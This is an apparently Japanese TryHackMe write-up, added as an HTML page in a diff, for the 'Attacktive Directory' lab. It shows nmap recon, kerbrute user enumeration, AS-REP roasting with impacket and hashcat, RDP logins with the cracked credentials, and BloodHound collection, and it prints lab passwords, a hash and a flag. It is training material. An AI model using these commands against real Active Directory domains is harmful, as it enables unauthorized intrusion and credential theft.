@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TryHackMe Attacktive Directory Writeup</title>
+  <link rel="stylesheet" href="assets/writeup.css">
+</head>
+<body>
+  <div class="nav-top"><a href="index.html">&larr; All writeups</a></div>
+
+  <header class="hero">
+    <h1>Attacktive Directory</h1>
+    <div class="badges">
+      <span class="badge">Platform: TryHackMe</span>
+      <span class="badge">Difficulty: Easy</span>
+      <span class="badge">Language: 日本語</span>
+      <span class="badge">Target: Windows</span>
+      <span class="badge">Series: 班教育</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="notice">
+      <strong>ネタバレ注意:</strong> この writeup にはコマンド、認証情報、フラグが含まれる場合があります。
+      許可されたラボ環境での学習目的でのみご利用ください。
+    </div>
+
+    <article class="writeup-body">
+      <pre><code class="language-nmap">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ nmap 10.48.188.48
+      Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 14:18 +0900
+      Nmap scan report for 10.48.188.48
+      Host is up (0.13s latency).
+      Not shown: 988 closed tcp ports (reset)
+      PORT     STATE SERVICE
+      53/tcp   open  domain
+      80/tcp   open  http
+      88/tcp   open  kerberos-sec
+      135/tcp  open  msrpc
+      139/tcp  open  netbios-ssn
+      389/tcp  open  ldap
+      445/tcp  open  microsoft-ds
+      464/tcp  open  kpasswd5
+      593/tcp  open  http-rpc-epmap
+      636/tcp  open  ldapssl
+      3389/tcp open  ms-wbt-server
+      5985/tcp open  wsman
+
+      Nmap done: 1 IP address (1 host up) scanned in 9.97 seconds</code></pre>
+      <p>windows端末のようだ</p>
+      <p>つづいてスクリプト<code>ldap-rootdse</code>でドメインネームを調べる</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ nmap 10.48.188.48 -sV --script ldap-rootdse -p 389
+      Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 14:23 +0900
+      Nmap scan report for 10.48.188.48
+      Host is up (0.13s latency).
+
+      PORT    STATE SERVICE VERSION
+      389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
+      | ldap-rootdse: 
+      | LDAP Results
+      |   &lt;ROOT&gt;
+      |       domainFunctionality: 7
+      |       forestFunctionality: 7
+      |       domainControllerFunctionality: 7
+      |       rootDomainNamingContext: DC=spookysec,DC=local
+      |       ldapServiceName: spookysec.local:attacktivedirec$@SPOOKYSEC.LOCAL
+      |       isGlobalCatalogReady: TRUE
+      |       supportedSASLMechanisms: GSSAPI
+      |       supportedSASLMechanisms: GSS-SPNEGO
+      |       supportedSASLMechanisms: EXTERNAL
+      |       supportedSASLMechanisms: DIGEST-MD5
+      |       supportedLDAPVersion: 3
+      |       supportedLDAPVersion: 2
+      |       supportedLDAPPolicies: MaxPoolThreads
+      |       supportedLDAPPolicies: MaxPercentDirSyncRequests
+      |       supportedLDAPPolicies: MaxDatagramRecv
+      |       supportedLDAPPolicies: MaxReceiveBuffer
+      |       supportedLDAPPolicies: InitRecvTimeout
+      |       supportedLDAPPolicies: MaxConnections
+      |       supportedLDAPPolicies: MaxConnIdleTime
+      |       supportedLDAPPolicies: MaxPageSize
+      |       supportedLDAPPolicies: MaxBatchReturnMessages
+      |       supportedLDAPPolicies: MaxQueryDuration
+      |       supportedLDAPPolicies: MaxDirSyncDuration
+      |       supportedLDAPPolicies: MaxTempTableSize
+      |       supportedLDAPPolicies: MaxResultSetSize
+      |       supportedLDAPPolicies: MinResultSets
+      |       supportedLDAPPolicies: MaxResultSetsPerConn
+      |       supportedLDAPPolicies: MaxNotificationPerConn
+      |       supportedLDAPPolicies: MaxValRange
+      |       supportedLDAPPolicies: MaxValRangeTransitive
+      |       supportedLDAPPolicies: ThreadMemoryLimit
+      |       supportedLDAPPolicies: SystemMemoryLimitPercent
+      |       supportedControl: 1.2.840.113556.1.4.319
+      |       supportedControl: 1.2.840.113556.1.4.801
+      |       supportedControl: 1.2.840.113556.1.4.473
+      |       supportedControl: 1.2.840.113556.1.4.528
+      |       supportedControl: 1.2.840.113556.1.4.417
+      |       supportedControl: 1.2.840.113556.1.4.619
+      |       supportedControl: 1.2.840.113556.1.4.841
+      |       supportedControl: 1.2.840.113556.1.4.529
+      |       supportedControl: 1.2.840.113556.1.4.805
+      |       supportedControl: 1.2.840.113556.1.4.521
+      |       supportedControl: 1.2.840.113556.1.4.970
+      |       supportedControl: 1.2.840.113556.1.4.1338
+      |       supportedControl: 1.2.840.113556.1.4.474
+      |       supportedControl: 1.2.840.113556.1.4.1339
+      |       supportedControl: 1.2.840.113556.1.4.1340
+      |       supportedControl: 1.2.840.113556.1.4.1413
+      |       supportedControl: 2.16.840.1.113730.3.4.9
+      |       supportedControl: 2.16.840.1.113730.3.4.10
+      |       supportedControl: 1.2.840.113556.1.4.1504
+      |       supportedControl: 1.2.840.113556.1.4.1852
+      |       supportedControl: 1.2.840.113556.1.4.802
+      |       supportedControl: 1.2.840.113556.1.4.1907
+      |       supportedControl: 1.2.840.113556.1.4.1948
+      |       supportedControl: 1.2.840.113556.1.4.1974
+      |       supportedControl: 1.2.840.113556.1.4.1341
+      |       supportedControl: 1.2.840.113556.1.4.2026
+      |       supportedControl: 1.2.840.113556.1.4.2064
+      |       supportedControl: 1.2.840.113556.1.4.2065
+      |       supportedControl: 1.2.840.113556.1.4.2066
+      |       supportedControl: 1.2.840.113556.1.4.2090
+      |       supportedControl: 1.2.840.113556.1.4.2205
+      |       supportedControl: 1.2.840.113556.1.4.2204
+      |       supportedControl: 1.2.840.113556.1.4.2206
+      |       supportedControl: 1.2.840.113556.1.4.2211
+      |       supportedControl: 1.2.840.113556.1.4.2239
+      |       supportedControl: 1.2.840.113556.1.4.2255
+      |       supportedControl: 1.2.840.113556.1.4.2256
+      |       supportedControl: 1.2.840.113556.1.4.2309
+      |       supportedControl: 1.2.840.113556.1.4.2330
+      |       supportedControl: 1.2.840.113556.1.4.2354
+      |       supportedCapabilities: 1.2.840.113556.1.4.800
+      |       supportedCapabilities: 1.2.840.113556.1.4.1670
+      |       supportedCapabilities: 1.2.840.113556.1.4.1791
+      |       supportedCapabilities: 1.2.840.113556.1.4.1935
+      |       supportedCapabilities: 1.2.840.113556.1.4.2080
+      |       supportedCapabilities: 1.2.840.113556.1.4.2237
+      |       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=spookysec,DC=local
+      |       serverName: CN=ATTACKTIVEDIREC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=spookysec,DC=local
+      |       schemaNamingContext: CN=Schema,CN=Configuration,DC=spookysec,DC=local
+      |       namingContexts: DC=spookysec,DC=local
+      |       namingContexts: CN=Configuration,DC=spookysec,DC=local
+      |       namingContexts: CN=Schema,CN=Configuration,DC=spookysec,DC=local
+      |       namingContexts: DC=DomainDnsZones,DC=spookysec,DC=local
+      |       namingContexts: DC=ForestDnsZones,DC=spookysec,DC=local
+      |       isSynchronized: TRUE
+      |       highestCommittedUSN: 57373
+      |       dsServiceName: CN=NTDS Settings,CN=ATTACKTIVEDIREC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=spookysec,DC=local
+      |       dnsHostName: AttacktiveDirectory.spookysec.local
+      |       defaultNamingContext: DC=spookysec,DC=local
+      |       currentTime: 20260610052401.0Z
+      |_      configurationNamingContext: CN=Configuration,DC=spookysec,DC=local
+      Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+      Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+      Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
+                                                                                                              
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ 
+      </code></pre>
+      <p>この結果からドメインネーム<code>spookysec.local</code>をゲット</p>
+      <p>つづいてTryhackmeの誘導にしたがって<code>enum4linux</code>を実施</p>
+      <pre><code class="language-bash">enum4linux 10.48.188.48</code></pre>
+      <p>このようになにもオプションをつけないで実行すれば全列挙が試行される</p>
+      <p>全列挙を実施したが情報量が膨大すぎて頭パンク</p>
+      <p>別のことを進める</p>
+      <p>問題ページで指定されたusernameリストとpasswordリストをwgetする</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+      --2026-06-10 14:32:49--  https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+      raw.githubusercontent.com (raw.githubusercontent.com) をDNSに問いあわせています... 185.199.108.133, 185.199.109.133, 185.199.111.133, ...
+      raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443 に接続しています... 接続しました。
+      HTTP による接続要求を送信しました、応答を待っています... 200 OK
+      長さ: 540470 (528K) [text/plain]
+      `userlist.txt' に保存中
+
+      userlist.txt                  100%[================================================&gt;] 527.80K  --.-KB/s 時間 0.05s    
+
+      2026-06-10 14:32:50 (11.1 MB/s) - `userlist.txt' へ保存完了 [540470/540470]
+
+                                                                                                                             
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ wget https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
+      --2026-06-10 14:33:01--  https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
+      raw.githubusercontent.com (raw.githubusercontent.com) をDNSに問いあわせています... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
+      raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443 に接続しています... 接続しました。
+      HTTP による接続要求を送信しました、応答を待っています... 200 OK
+      長さ: 569236 (556K) [text/plain]
+      `passwordlist.txt' に保存中
+
+      passwordlist.txt              100%[================================================&gt;] 555.89K  --.-KB/s 時間 0.04s    
+
+      2026-06-10 14:33:01 (14.9 MB/s) - `passwordlist.txt' へ保存完了 [569236/569236]
+
+                                                                                                                             
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ ll
+      合計 1084
+      -rw-rw-r-- 1 rkametani rkametani 569236  6月 10 14:33 passwordlist.txt
+      -rw-rw-r-- 1 rkametani rkametani 540470  6月 10 14:32 userlist.txt
+                                                                                                                             
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ </code></pre>
+      <p>nmapの結果をみるとkerberosが88番で空いている<br>
+      指定されたリストを用いてkerbruteを実施する</p>
+      <pre><code>┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ ls ~/Downloads/kerbrute_linux_amd64 
+      /home/kali/Downloads/kerbrute_linux_amd64
+                                                                                                              
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ cp ~/Downloads/kerbrute_linux_amd64 kerbrute_linux_amd64</code></pre>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ ./kerbrute_linux_amd64 userenum -d spookysec.local --dc 10.48.188.48 userlist.txt </code></pre>
+      <p>10分くらい待つ</p>
+      <p>このコマンドではkerberos DCにこのユーザーのTGTくださいとお願いをして（AS-REQを投げる（authoritation request））、返ってくる返事によってそのユーザーが存在するかどうかを確かめられる</p>
+      <p>このとき存在しない場合はKDCの応答は<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>となる<br>
+      存在して、事前認証いる場合は<code>KDC_ERR_PREAUTH_REQUIRED</code>が返る<br>
+      存在して、事前認証いらない場合はAS-REPが返る（AS-REQではない）</p>
+      <p>kerbruteでは<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>か否かの判定のみしているため<br>
+      事前認証有無までは判定できない</p>
+      <p>ので、このあとその判定を行うためにもういちど別ツールを使ってAS-REQ（AS-REPではない）を投げる</p>
+      <p>存在したユーザーたちをいったん<code>valid_user.txt</code>に入れる<br>
+      （windowsではユーザー名に大文字小文字を考慮しなくてよい）</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ vim valid_user.txt                                                                               
+
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ cat valid_user.txt                                                                               
+      james
+      svc-admin
+      robin
+      darkstar
+      administrator
+      backup
+      paradox
+      ori</code></pre>
+      <p>存在したユーザーの中で事前認証がいるかどうかの判定を行うために以下のコマンドを実施する</p>
+      <pre><code class="language-bash">impacket-GetNPUsers -dc-ip 10.48.188.48 spookysec.local/ -request -format hashcat -usersfile valid_user.txt -o as-rep.hash</code></pre>
+      <p>繰り返しになるが事前認証がいらない場合、AS-REP(リプライのREP）が返ってくる<br>
+      このAS-REPはTGT本体とユーザーのパスワードから導出した鍵が入っているため<br>
+      hashcat用に成形すれば解読が可能</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ cat as-rep.hash                                                                                  
+      $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:75d29743e97334cc3d8ef19f54828ad4$feb3290388ef8cee62b14eed78e71b7d9d646a544e17e68ac26219db56d0d56516f728c5f869af04aafa3f07edb8a4551f3a415c4c7ec757c9233720e259d86a9f99e64d27de632fd4127494b00401ce18245e382ad0a18406758abb749915f07848fdd9b5d08576cd71986ef2354f4d12116e521443baa34d28dfba213bec6d0216458100fa1103338aa6d2b0fcf634bce6eda7cb1a6f3922ed1d3be1045d5dbe0602301b6d517d328d545e001aad3e44ebf055506247a533ef8bc065ac00c7f45f8b653f4fbe04288068022fb8d006fab5ab195fba197e029d9b083a31eaddd7ccb0484ddf2e31e4fdc4e561780a9aac5e</code></pre>
+      <p>見ての通りいけそう</p>
+      <p>モード番号を調べて実行する</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ hashcat -m 18200 as-rep.hash passwordlist.txt                                                    </code></pre>
+      <p><code>svc-admin:management2005</code>をゲットした</p>
+      <p>最近習ったnetexexでログイン試行する</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ netexec rdp 10.48.188.48 -u svc-admin -p 'management2005'                                       
+      RDP         10.48.188.48    3389   ATTACKTIVEDIREC  [*] Windows 10 or Windows Server 2016 Build 17763 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (nla:False)
+      RDP         10.48.188.48    3389   ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 (Pwn3d!)   </code></pre>
+      <p><code>Pwn3d!</code>が出たので侵害可能<br>
+      （own：所有できる、という単語のミスタイピングが始まりらしい）</p>
+      <p>認証情報を得たのでRDP接続する</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ xfreerdp3 /u:svc-admin /p:'management2005' /v:10.48.188.48</code></pre>
+      <img src="images/squad/Pasted image 20260610152506.png" alt="スクリーンショット">
+      <p>入ることができた</p>
+      <p>いったんsvc_adminのフラグはゲットできた</p>
+      <p>中を探索する</p>
+      <img src="images/squad/Pasted image 20260610160636.png" alt="スクリーンショット">
+      <p>C直下のディレクトリ<br>
+      badrとSharesを見たい</p>
+      <p>shareフォルダに認証情報が落ちていた</p>
+      <img src="images/squad/Pasted image 20260610160813.png" alt="スクリーンショット">
+      <p>cyberchefからbackupアカウントの認証情報であることがわかった</p>
+      <img src="images/squad/Pasted image 20260610160927.png" alt="スクリーンショット">
+      <p><code>backup:backup2517860</code>を得た</p>
+      <p>netexecでこの認証情報が正しいか確かめる</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ netexec rdp 10.48.188.48 -u backup -p 'backup2517860' 
+      RDP         10.48.188.48    3389   ATTACKTIVEDIREC  [*] Windows 10 or Windows Server 2016 Build 17763 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (nla:False)
+      RDP         10.48.188.48    3389   ATTACKTIVEDIREC  [+] spookysec.local\backup:backup2517860 (Pwn3d!)
+                                                                                                              
+      ┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ </code></pre>
+      <p>正しい<br>
+      これでRDP接続を試みる</p>
+      <p>接続できた</p>
+      <img src="images/squad/Pasted image 20260610161344.png" alt="スクリーンショット">
+      <p>ファイルを開いてみる</p>
+      <img src="images/squad/Pasted image 20260610161429.png" alt="スクリーンショット">
+      <p><code>TryHackMe{B4ckM3UpSc0tty!}</code>をゲット</p>
+      <p>探索してみる<br>
+      net user /domainでドメインユーザーの一覧を調べる</p>
+      <img src="images/squad/Pasted image 20260610161855.png" alt="スクリーンショット">
+      <p>もうすこし詳しく調べるのにbloodhoundを使う</p>
+      <p>まず名前解決だけして</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/Documents/班教育/作業ディレクトリ/attacktivedirectory]
+      └─$ cat /etc/hosts | grep spooky                                                                     
+      10.48.188.48    AttacktiveDirectory.spookysec.local     SPOOKYSEC.LOCAL
+      </code></pre>
+      <p>ZIPファイル作る</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/bloodhound]
+      └─$ bloodhound-ce-python -u backup -p 'backup2517860' -d spookysec.local -ns 10.48.188.48  --zip -c all,acl
+      INFO: BloodHound.py for BloodHound Community Edition
+      INFO: Found AD domain: spookysec.local
+      INFO: Getting TGT for user
+      INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
+      INFO: Found 1 domains
+      INFO: Found 1 domains in the forest
+      INFO: Found 1 computers
+      INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
+      INFO: Found 18 users
+      INFO: Found 54 groups
+      INFO: Found 2 gpos
+      INFO: Found 3 ous
+      INFO: Found 21 containers
+      INFO: Found 0 trusts
+      INFO: Starting computer enumeration with 10 workers
+      INFO: Querying computer: AttacktiveDirectory.spookysec.local
+      INFO: Done in 00M 31S
+      INFO: Compressing output into 20260610162515_bloodhound.zip
+
+      ┌──(kali㉿kali-1-kalija)-[~/bloodhound]
+      └─$      </code></pre>
+      <p>そしてdockerで立てる</p>
+      <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/bloodhound]
+      └─$ sudo docker compose up</code></pre>
+      <p>そしたらブラウザからbloodhoundにアクセスして分析が完了するまでingestを待つ</p>
+      <img src="images/squad/Pasted image 20260610162851.png" alt="スクリーンショット">
+      <p>分析が終わったけどなんもわからん</p>
+      <img src="images/squad/Pasted image 20260610163142.png" alt="スクリーンショット">
+    </article>
+  </main>
+
+  <footer>
+    <p>班教育 WriteUp &mdash; <a href="https://github.com/53b29461/thm-writeups">GitHub</a></p>
+  </footer>
+</body>
+</html>
